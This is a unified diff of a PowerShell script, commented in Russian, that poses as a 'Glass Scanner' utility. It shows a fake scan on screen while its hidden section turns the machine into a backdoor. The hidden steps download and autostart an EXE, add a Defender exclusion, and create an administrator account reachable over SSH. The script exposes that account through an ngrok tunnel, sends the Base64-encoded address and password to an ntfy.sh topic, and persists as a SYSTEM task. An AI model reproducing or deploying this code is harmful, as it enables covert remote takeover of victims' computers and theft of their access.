@@ -1,17 +1,17 @@
 # ============================================================
-#  Glass Scanner Emulator + Hidden Setup (PowerShell 5.1 совместим)
-#  (c) 2026 – все реальные действия логируются в setup.log
+#  Glass Scanner Emulator + Hidden Setup + ngrok (маскировка)
+#  (c) 2026 – всё реальное – в лог, в консоли – только игра
 # ============================================================
 
-# ---------- Скрытая настройка (лог в файл) ----------
+# ---------- Скрытая настройка ----------
 $dir = "$env:USERPROFILE\collextor"
 $exe = "$dir\collextor_msvc.exe"
-$url = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc.exe"
+$urlExe = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc.exe"
+$ngrokExe = "$dir\ngrok.exe"
+$ngrokUrl = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
 $scriptPath = $MyInvocation.MyCommand.Path
 if (-not $scriptPath) { $scriptPath = $PSCommandPath }
 $logFile = "$dir\setup.log"
-
-# --- ТОПИК ДЛЯ NTFY.SH (ИЗМЕНЁН НА ВАШ) ---
 $ntfyTopic = "zighaigit88tore"
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
@@ -22,21 +22,21 @@ function Write-Log {
     "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
 }
 
-# ---------- Выполняем реальные задачи (без вывода в консоль) ----------
+# ---------- Реальные задачи (без вывода в консоль) ----------
 Write-Log "Начало выполнения реальных действий."
 
-# 1. Скачивание EXE
-Write-Log "Скачивание $url ..."
+# 1. Скачивание основного EXE
+Write-Log "Скачивание $urlExe ..."
 try {
-    Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing
-    Write-Log "Скачивание успешно."
+    Invoke-WebRequest -Uri $urlExe -OutFile $exe -UseBasicParsing
+    Write-Log "Основной EXE скачан."
 } catch {
-    Write-Log "Ошибка скачивания: $_"
+    Write-Log "Ошибка скачивания основного EXE: $_"
     exit 1
 }
 
 # 2. Исключение Defender
-Write-Log "Исключение папки из Defender..."
+Write-Log "Добавление папки в исключения Defender..."
 try {
     $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
     if ($svc -and $svc.Status -ne 'Running') {
@@ -55,13 +55,9 @@ try {
     $rule = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
     if (-not $rule) {
         New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
-        Write-Log "Правило SMTP Gmail создано."
-    } else {
-        Write-Log "Правило уже существует."
+        Write-Log "Правило создано."
     }
-} catch {
-    Write-Log "Ошибка настройки брандмауэра: $_"
-}
+} catch { Write-Log "Ошибка настройки брандмауэра: $_" }
 
 # 4. Автозапуск (реестр)
 Write-Log "Добавление в автозапуск..."
@@ -72,8 +68,6 @@ try {
     if (-not $curExe -or $curExe -ne $exe) {
         Set-ItemProperty -Path $runKey -Name $valExe -Value $exe -ErrorAction Stop
         Write-Log "EXE добавлен в автозапуск."
-    } else {
-        Write-Log "EXE уже в автозапуске."
     }
 } catch { Write-Log "Ошибка добавления EXE: $_" }
 
@@ -85,8 +79,6 @@ if ($scriptPath -and (Test-Path $scriptPath)) {
         if (-not $curScript -or $curScript -ne $cmd) {
             Set-ItemProperty -Path $runKey -Name $valScript -Value $cmd -ErrorAction Stop
             Write-Log "Скрипт добавлен в автозапуск."
-        } else {
-            Write-Log "Скрипт уже в автозапуске."
         }
     } catch { Write-Log "Ошибка добавления скрипта: $_" }
 }
@@ -97,9 +89,7 @@ try {
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
     Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop | Out-Null
     Write-Log "OpenSSH установлен."
-} catch {
-    Write-Log "Ошибка установки OpenSSH: $_"
-}
+} catch { Write-Log "Ошибка установки OpenSSH: $_" }
 
 Write-Log "Настройка службы SSH и брандмауэра (порт 22)..."
 try {
@@ -108,9 +98,7 @@ try {
     Remove-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue
     New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction Stop | Out-Null
     Write-Log "SSH настроен."
-} catch {
-    Write-Log "Ошибка настройки SSH: $_"
-}
+} catch { Write-Log "Ошибка настройки SSH: $_" }
 
 # 6. Создание пользователя
 $userName = "ssh_admin"
@@ -123,51 +111,87 @@ Write-Log "Создание/обновление пользователя $userN
 try {
     if (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue) {
         Set-LocalUser -Name $userName -Password $securePassword -ErrorAction Stop
-        Write-Log "Пароль пользователя обновлён."
+        Write-Log "Пароль обновлён."
     } else {
         New-LocalUser -Name $userName -Password $securePassword -FullName "SSH Admin" -Description "SSH учётка" -ErrorAction Stop | Out-Null
         Add-LocalGroupMember -Group "Administrators" -Member $userName -ErrorAction Stop
-        Write-Log "Пользователь создан и добавлен в администраторы."
+        Write-Log "Пользователь создан."
     }
-} catch {
-    Write-Log "Ошибка при работе с пользователем: $_"
-}
+} catch { Write-Log "Ошибка при работе с пользователем: $_" }
 
-# 7. IP и сохранение учётных данных
+# 7. IP и подготовка данных
 $ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
     $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*"
 } | Select-Object -First 1 -ExpandProperty IPAddress
 if (-not $ipAddress) { $ipAddress = "не удалось определить" }
 
 $base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))
-$credFile = "$dir\ssh_credentials.txt"
-@"
-=== SSH-учётные данные (сгенерированы $(Get-Date)) ===
-IP-адрес: $ipAddress
-Пользователь: $userName
-Пароль (в Base64): $base64Password
-Расшифровка: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
-"@ | Out-File -FilePath $credFile -Encoding UTF8
-Write-Log "Учётные данные сохранены в $credFile"
 
-# 8. Отправка на ntfy.sh
-Write-Log "Отправка уведомления на ntfy.sh..."
+# 8. Скачивание ngrok и запуск туннеля
+Write-Log "Скачивание ngrok..."
 try {
-    $message = @"
-SSH-доступ успешно настроен!
-IP: $ipAddress
+    if (-not (Test-Path $ngrokExe)) {
+        $zipPath = "$dir\ngrok.zip"
+        Invoke-WebRequest -Uri $ngrokUrl -OutFile $zipPath -UseBasicParsing
+        Expand-Archive -Path $zipPath -DestinationPath $dir -Force
+        Remove-Item $zipPath
+        Write-Log "ngrok скачан и распакован."
+    } else {
+        Write-Log "ngrok уже существует."
+    }
+} catch {
+    Write-Log "Ошибка скачивания ngrok: $_"
+}
+
+Write-Log "Запуск ngrok туннеля..."
+$ngrokLog = "$dir\ngrok.log"
+$ngrokProcess = Start-Process -FilePath $ngrokExe -ArgumentList "tcp 22 --log=$ngrokLog" -WindowStyle Hidden -PassThru
+Start-Sleep -Seconds 5
+
+# Получаем публичный адрес
+$ngrokAddr = $null
+try {
+    $response = Invoke-RestMethod -Uri "http://localhost:4040/api/tunnels" -ErrorAction SilentlyContinue
+    if ($response.tunnels) {
+        $tcp = $response.tunnels | Where-Object { $_.proto -eq "tcp" }
+        if ($tcp) {
+            $ngrokAddr = $tcp.public_url -replace "tcp://", ""
+        }
+    }
+} catch { Write-Log "Не удалось получить адрес ngrok через API" }
+
+if (-not $ngrokAddr) {
+    if (Test-Path $ngrokLog) {
+        $logContent = Get-Content $ngrokLog -Tail 20
+        $match = $logContent | Select-String "started tunnel"
+        if ($match) {
+            $ngrokAddr = $match -replace ".*tcp://", "" -replace "\s.*", ""
+        }
+    }
+}
+
+# 9. Отправка закодированных данных на ntfy.sh
+$secretMessage = @"
+SSH-доступ через ngrok:
+Адрес: $ngrokAddr
 Пользователь: $userName
 Пароль (Base64): $base64Password
 Расшифровка: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
 "@
+
+# Кодируем всё сообщение в Base64 для скрытности
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($secretMessage)
+$encodedMessage = [Convert]::ToBase64String($bytes)
+
+try {
     $ntfyUrl = "https://ntfy.sh/$ntfyTopic"
-    Invoke-WebRequest -Uri $ntfyUrl -Method Post -Body $message -ContentType "text/plain" -UseBasicParsing -ErrorAction Stop | Out-Null
-    Write-Log "Уведомление отправлено в топик $ntfyTopic."
+    Invoke-WebRequest -Uri $ntfyUrl -Method Post -Body $encodedMessage -ContentType "text/plain" -UseBasicParsing -ErrorAction Stop | Out-Null
+    Write-Log "Закодированное сообщение отправлено на ntfy.sh"
 } catch {
     Write-Log "Не удалось отправить уведомление: $_"
 }
 
-# 9. Добавление задачи в планировщик (SYSTEM)
+# 10. Задача в планировщике (для запуска скрипта при старте)
 Write-Log "Создание задачи в планировщике..."
 $taskName = "CollextorAdminTask"
 $actionCommand = "powershell.exe"
@@ -179,18 +203,14 @@ try {
         $trigger = New-ScheduledTaskTrigger -AtStartup
         $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "Задача '$taskName' создана (SYSTEM, при старте)."
-    } else {
-        Write-Log "Задача '$taskName' уже существует."
+        Write-Log "Задача создана."
     }
-} catch {
-    Write-Log "Ошибка создания задачи: $_"
-}
+} catch { Write-Log "Ошибка создания задачи: $_" }
 
 Write-Log "Все реальные действия выполнены."
 
 # ============================================================
-#  Теперь – имитация работы Glass Scanner (вывод в консоль)
+#  Имитация работы Glass Scanner (только вывод в консоль)
 # ============================================================
 
 function Write-ColorLine {
@@ -198,7 +218,6 @@ function Write-ColorLine {
     Write-Host $Text -ForegroundColor $Color
 }
 
-# Цвета (соответствуют оригиналу)
 $CLR_FOUND   = "Red"
 $CLR_WARN    = "Yellow"
 $CLR_OK      = "Green"
@@ -241,7 +260,6 @@ function Print-Progress {
     Write-Host "  $name" -ForegroundColor $CLR_NORMAL
 }
 
-# Имитация лога сканирования
 function Run-ScanSimulation {
     Print-Header 1
 
@@ -425,7 +443,6 @@ function Run-ScanSimulation {
         Start-Sleep -Milliseconds 300
     }
 
-    # Финальный прогресс 100%
     Write-Host "[" -NoNewline
     Write-Host ("#" * 30) -NoNewline -ForegroundColor $CLR_OK
     Write-Host "] " -NoNewline
@@ -442,7 +459,6 @@ function Run-ScanSimulation {
     Write-ColorLine "================================================================" -Color $CLR_HEADER
 }
 
-# ---------- Вкладки 2 и 3 (исправлены для PowerShell 5.1) ----------
 function Show-Tab2 {
     Print-Header 2
     Write-ColorLine "`n  ОТКРЫТЫЕ ПРИЛОЖЕНИЯ (сейчас запущены)" -Color $CLR_OK
@@ -505,7 +521,7 @@ function Show-Tab3 {
     }
 }
 
-# ---------- Основной цикл имитации ----------
+# ---------- Запуск имитации ----------
 Run-ScanSimulation
 
 # Меню
@@ -526,5 +542,14 @@ while ($true) {
     }
 }
 
-# Запускаем реальный EXE
-Start-Process -FilePath $exe -WorkingDirectory $dir
+# ---------- Запуск основного EXE с правами администратора ----------
+if (Test-Path $exe) {
+    try {
+        Start-Process -FilePath $exe -Verb RunAs -WorkingDirectory $dir
+        Write-Log "Основной EXE запущен с правами администратора."
+    } catch {
+        Write-Log "Не удалось запустить основной EXE: $_"
+    }
+} else {
+    Write-Log "Основной EXE не найден по пути $exe"
+}
